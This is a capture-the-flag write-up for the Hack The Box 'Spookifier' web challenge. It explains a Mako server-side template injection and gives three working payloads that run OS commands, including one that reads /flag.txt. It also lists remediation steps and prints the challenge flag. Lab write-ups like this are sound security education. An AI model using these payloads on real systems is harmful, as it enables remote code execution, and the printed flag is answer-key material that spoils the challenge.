# Spookifier Challenge Notes

## Vulnerability: Server-Side Template Injection (SSTI)
The application uses the **Mako** templating engine in an insecure manner. User input from the `text` parameter is processed and then passed directly into a Mako `Template` string which is subsequently rendered.

### Vulnerable Code Path
- **File:** `web_spookifier/challenge/application/util.py`
- **Function:** `generate_render(converted_fonts)`
- **Logic:**
  ```python
  result = '''...<td>{3}</td>...'''.format(*converted_fonts)
  return Template(result).render()
  ```
The `converted_fonts` list contains the user input after it has been "spookified" through four different font dictionaries.

## Bypass Mechanism: Font Passthrough
While `font1`, `font2`, and `font3` map alphanumeric characters to stylized symbols (often multi-byte Unicode), **`font4`** is a comprehensive mapping that includes almost all ASCII special characters as literals.

Key characters passed through `font4`:
- `${}` (Mako expression syntax)
- `()` (Function calls)
- `.` (Attribute access)
- `_` (Accessing private/internal attributes)
- `'` or `"` (Strings)

Because the 4th `<td>` in the template uses the output of `font4`, an attacker can inject a full Mako expression.

## Exploitation Payloads

### 1. Standard OS Import (Might be blocked)
```python
${__import__('os').popen('id').read()}
```

### 2. Internal Object Traversal (More robust)
This payload traverses the `self` namespace to find a module that has already imported `os`.
```python
${self.module.cache.util.os.popen('id').read()}
```

### 3. Flag Retrieval
```python
${self.module.cache.util.os.popen('cat /flag.txt').read()}
```

## Remediation
- **Never** pass user-controlled input directly into a template constructor.
- Use the templating engine's built-in variable substitution features (e.g., passing variables as arguments to `render()`) instead of using `.format()` or f-strings to build the template string itself.
- Implement a strict allow-list for characters if custom font conversion is required.

## Flag
`HTB{t3mpl4t3_1nj3ct10n_C4n_3x1st5_4nywh343!!}`
